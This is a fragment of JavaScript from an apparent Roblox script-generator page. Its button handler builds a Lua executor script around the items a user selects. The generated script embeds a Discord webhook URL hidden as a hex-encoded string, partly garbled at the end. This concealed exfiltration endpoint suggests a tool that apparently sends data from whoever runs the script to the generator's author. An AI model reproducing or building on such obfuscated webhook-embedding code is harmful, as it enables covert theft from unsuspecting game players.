...
generateBtn.addEventListener("click",()=>{
  ...
  setTimeout(()=>{
    let script = `getgenv().WEBHOOK_URL = "68747470733a2f2f646973636f72642e636f6d2f6160692f776562686f6f6b732f31343830333136343739303038383236342f4861735858314870695947494c2d7056723248656f56476839784e6f75477957655fX25mSlcMQ29WMFbmFcCL4VA5ipQixQ2iHd7"
...
`;
    selected.forEach((b,i)=>{
      script+=`    ["${b}"] = true${i<selected.length-1?",":""}\n`;
    });
    script+=`}
